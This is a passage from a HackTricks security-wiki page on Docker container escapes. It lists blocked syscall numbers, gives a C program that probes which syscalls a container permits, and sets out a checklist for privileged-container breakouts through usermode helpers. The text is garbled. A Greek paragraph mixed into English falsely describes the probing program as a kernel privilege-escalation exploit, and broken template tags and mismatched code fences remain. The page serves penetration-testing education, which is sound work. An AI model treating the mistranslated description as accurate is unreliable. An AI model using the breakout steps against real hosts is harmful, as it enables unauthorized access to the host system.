#### Disclaimer

This module is for educational purposes only. Do not use it for illegal activities.

```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}
Το syscall\_bf.c είναι ένα εργαλείο που χρησιμοποιείται για την εκτέλεση επιθέσεων προνομιακής αύξησης στο Docker. Αυτό το εργαλείο εκμεταλλεϊεται μια ευπάθεια στον πυρήνα Linux που επιτρέπει σε χρήστες με προνομιακά δικαιώματα στον χώρο χρήστη να αποκτήσουν πρόσβαση σε προνομιακές λειτουργίες. Χρησιμοποιείται για την ανάπτυξη και την εκτέλεση επιθέσεων διαρροής προνομίων. %\}

````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
